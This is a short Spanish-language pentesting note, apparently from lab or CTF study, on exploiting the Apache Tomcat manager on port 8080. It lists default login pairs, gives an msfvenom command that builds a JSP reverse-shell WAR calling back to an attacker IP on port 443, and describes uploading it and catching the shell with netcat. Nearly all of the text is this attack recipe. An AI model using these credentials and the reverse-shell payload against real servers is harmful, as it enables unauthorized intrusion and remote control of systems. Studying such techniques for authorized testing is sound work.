Explotación: Apache Tomcat - 8080

Acceder a la ruta http://ip:8080/manager/html con las credenciales por defecto válidas y subir un archivo WAR malicioso

* admin:admin

* tomcat:tomcat

* tomcat:s3cret :CoCheckAllBig:

* root:root

>:CoNote: Tomcat es una aplicación Java que corre sobre la JVM por eso el payload es Java

Crear payload .war y subirlo al WAR file to deploy

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.18 LPORT=443 -f war -o shell.war

Subimos el payload desde la interfaz y nos ponemos en escucha con netcat, para darle solo click al enlace /shell
